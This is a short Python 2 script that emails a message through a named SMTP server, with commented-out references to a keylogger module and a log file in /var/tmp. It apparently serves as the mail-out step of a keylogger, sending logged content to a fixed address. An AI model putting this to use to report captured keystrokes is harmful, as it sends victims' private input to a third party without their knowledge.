#!/usr/bin/python
"""
Help: https://docs.python.org/2/library/email-examples.html

"""
import smtplib
import datetime
# import keylogger
from email.mime.text import MIMEText


# contect_file = '/var/tmp/logger.log'
# message = "Test Message2"
#""" If you want send mail using gmail then make change according to commected section bellow"""

def send_mail(message):
    try:
        me = 'sarah@ipvbd.com'
        you = 'uzzal@ipvbd.com'
        # username = 'xxxx'
        # password = 'xxxx'

        msg = MIMEText(message)
        msg['subject'] = 'The Content of ' + str(datetime.datetime.now())
        msg['From'] = me
        msg['To'] = you
        # s = smtplib.SMTP('smtp.gmail.com:587')
        # s.starttls()
        s = smtplib.SMTP('mail.ipvbd.com')
        # s.login(username, password)
        s.sendmail(me, [you], msg.as_string())
        s.quit()

    except Exception as e:
        print e.__str__() + 'Error while sending mail- , Please contact support uzzal2k5@gmail.com'
        # open log_file again here to send email already stored into the log_file
